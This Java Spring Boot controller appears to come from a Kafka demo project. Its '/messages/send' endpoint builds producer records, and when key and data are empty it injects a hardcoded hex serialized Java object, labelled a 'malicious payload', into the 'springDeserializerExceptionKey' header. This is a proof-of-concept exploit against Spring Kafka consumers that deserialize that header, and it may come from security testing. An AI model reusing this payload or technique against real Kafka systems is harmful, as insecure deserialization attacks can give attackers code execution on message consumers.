package com.example.SpringKafkaDemo.producer;

import com.example.SpringKafkaDemo.model.KafkaMessage;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.apache.kafka.clients.producer.ProducerRecord;
import org.apache.kafka.common.KafkaException;
import org.apache.kafka.common.header.Header;
import org.apache.kafka.common.header.internals.RecordHeader;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.kafka.core.KafkaTemplate;
import org.springframework.web.bind.annotation.*;

import java.util.Base64;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
@CrossOrigin(origins = "http://192.168.92.157:8899")
@RestController
@RequestMapping("/messages")
public class KafkaProducer {

    @Autowired
    private KafkaTemplate<String, String> kafkaTemplate;

    private final ObjectMapper objectMapper = new ObjectMapper(); // ObjectMapper for JSON conversion

    @PostMapping("/send")
    public String sendMessage(@RequestBody KafkaMessage message) {
        String topic = message.getTopic();
        String key = message.getKey();
        String data = message.getData();
        HashMap<String, String> headers = message.getHeaders();

        try {
            // Construct ProducerRecord for sending the message
            ProducerRecord<String, String> producerRecord = new ProducerRecord<>(topic, key, data);

            // If both key and data are null, add the serialized malicious payload to the header
            if (key == null && data == null) {
                String serializedPayloadHex = "aced0005737200456f72672e737072696e676672616d65776f726b2e6b61666b612e737570706f72742e73657269616c697a65722e446573657269616c697a6174696f6e457863657074696f6e72e88c7ed34e438d0200025a000569734b65795b0004646174617400025b42787200286f72672e737072696e676672616d65776f726b2e6b61666b612e4b61666b61457863657074696f6e4337db8ec78a8e550200014c00086c6f674c6576656c7400304c6f72672f737072696e676672616d65776f726b2f6b61666b612f4b61666b61457863657074696f6e244c6576656c3b7872002f6f72672e737072696e676672616d65776f726b2e636f72652e4e657374656452756e74696d65457863657074696f6e4b7e7648cb8f9f000200007872001a6a6176612e6c616e672e52756e74696d65457863657074696f6e9e5f06470a3483e5020000787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d6573736167657400124c6a6176612f6c616e672f537472696e673b5b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787073720035636f6d2e6578616d706c652e537072696e674b61666b6144656d6f2e646174612e437573746f6d457863657074696f6e436c61737386c5de22d73792720200007871007e000771007e000e707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000000017372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00094c000866696c654e616d6571007e00094c000a6d6574686f644e616d6571007e000978700000000b740044636f6d2e6578616d706c652e537072696e674b61666b6144656d6f2e646174612e436f6e7374727563744d616c6963696f757353657269616c697a6174696f6e44617461740028436f6e7374727563744d616c6963696f757353657269616c697a6174696f6e446174612e6a6176617400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e000b7872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b7870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a657870000000007704000000007871007e001b78740004746573747571007e000f000000017371007e00110000001071007e001371007e001471007e001571007e0019787e72002e6f72672e737072696e676672616d65776f726b2e6b61666b612e4b61666b61457863657074696f6e244c6576656c00000000000000001200007872000e6a6176612e6c616e672e456e756d000000000000000012000078707400054552524f5200757200025b42acf317f8060854e002000078700000000474657374";
                byte[] serializedPayload = hexStringToByteArray(serializedPayloadHex);
                producerRecord.headers().add("springDeserializerExceptionKey", serializedPayload);
            }

            // Add other headers if they are provided
            if (headers != null) {
                headers.forEach((k, v) -> producerRecord.headers().add(new RecordHeader(k, v.getBytes())));
            }

            // Convert ProducerRecord to JSON and store it in a variable
            System.out.println("producerRecord: " + producerRecord);
            String producerRecordJson = convertProducerRecordToJson(producerRecord);
            System.out.printf("producerRecordJson: %s%n", producerRecordJson);

            // Convert JSON back to ProducerRecord
            ProducerRecord<String, String> convertedProducerRecord = convertJsonToProducerRecord(producerRecordJson);
            System.out.printf("convertedProducerRecord: %s%n", convertedProducerRecord);

            // Compare records before sending
            boolean recordsAreEqual = producerRecord.equals(convertedProducerRecord);
            System.out.printf("Records are equal: %b%n", recordsAreEqual);
            // Send the record using KafkaTemplate
            if (convertedProducerRecord == null) {
                throw new AssertionError();
            }
            kafkaTemplate.send(convertedProducerRecord);
            return "{\"code\":\"200\", \"status\":\"success - message sent\"}";

        } catch (KafkaException e) {
            // Handle Kafka exceptions and return appropriate error response
            return "{\"code\":\"500\", \"status\":\"error\", \"message\":\"Kafka error: " + e.getMessage() + "\"}";
        } catch (Exception e) {
            return "{\"code\":\"500\", \"status\":\"error\", \"message\":\"JSON error: " + e.getMessage() + "\"}";
        }
    }

    // Helper method to convert a hexadecimal string into a byte array
    private byte[] hexStringToByteArray(String hexString) {
        int length = hexString.length();
        byte[] data = new byte[length / 2];
        for (int i = 0; i < length; i += 2) {
            data[i / 2] = (byte) ((Character.digit(hexString.charAt(i), 16) << 4)
                    + Character.digit(hexString.charAt(i + 1), 16));
        }
        return data;
    }

    // Convert ProducerRecord to JSON string
    private String convertProducerRecordToJson(ProducerRecord<String, String> producerRecord) {
        StringBuilder json = new StringBuilder("{");
        json.append("\"topic\": \"").append(producerRecord.topic()).append("\", ");
        json.append("\"partition\": ").append(producerRecord.partition()).append(", ");
        json.append("\"key\": ").append(producerRecord.key() != null ? "\"" + producerRecord.key() + "\"" : "null").append(", ");
        json.append("\"value\": ").append(producerRecord.value() != null ? "\"" + producerRecord.value() + "\"" : "null").append(", ");
        json.append("\"timestamp\": ").append(producerRecord.timestamp()).append(", ");
        json.append("\"headers\": {");

        producerRecord.headers().forEach(header -> {
            json.append("\"").append(Base64.getEncoder().encodeToString(header.key().getBytes())).append("\": "); // Base64 encode the header key
            json.append("\"").append(Base64.getEncoder().encodeToString(header.value())).append("\", "); // Base64 encode the header value
        });

        if (json.charAt(json.length() - 2) == ',') {
            json.delete(json.length() - 2, json.length()); // Remove trailing comma
        }
        json.append("}");

        json.append("}");
        // Return the entire JSON string
        return json.toString();
    }

    // Function to convert JSON string back to ProducerRecord object
    private ProducerRecord<String, String> convertJsonToProducerRecord(String jsonString) {
        try {
            // Print the incoming JSON string for debugging
            //System.out.println("Incoming JSON string: " + jsonString);

            JsonNode jsonNode = objectMapper.readTree(jsonString);

            String topic = jsonNode.get("topic").asText();
            String key = jsonNode.get("key").asText(null);
            String value = jsonNode.get("value").asText(null);
            Integer partition = jsonNode.has("partition") && !jsonNode.get("partition").isNull()
                    ? jsonNode.get("partition").asInt()
                    : null;

            ProducerRecord<String, String> producerRecord = new ProducerRecord<>(topic, partition, key, value);

            JsonNode headersNode = jsonNode.get("headers");
            if (headersNode != null) {
                Iterator<Map.Entry<String, JsonNode>> fields = headersNode.fields();
                while (fields.hasNext()) {
                    Map.Entry<String, JsonNode> entry = fields.next();

                    // Decode the Base64 header key
                    String headerKey = new String(Base64.getDecoder().decode(entry.getKey()));

                    // Decode the Base64 header value
                    byte[] headerValue = Base64.getDecoder().decode(entry.getValue().asText());

                    // Add the decoded header to the ProducerRecord
                    producerRecord.headers().add(new RecordHeader(headerKey, headerValue));
                }
            }

            return producerRecord;
        } catch (Exception e) {
            e.printStackTrace();
            return null; // or handle the error as appropriate
        }
    }
}

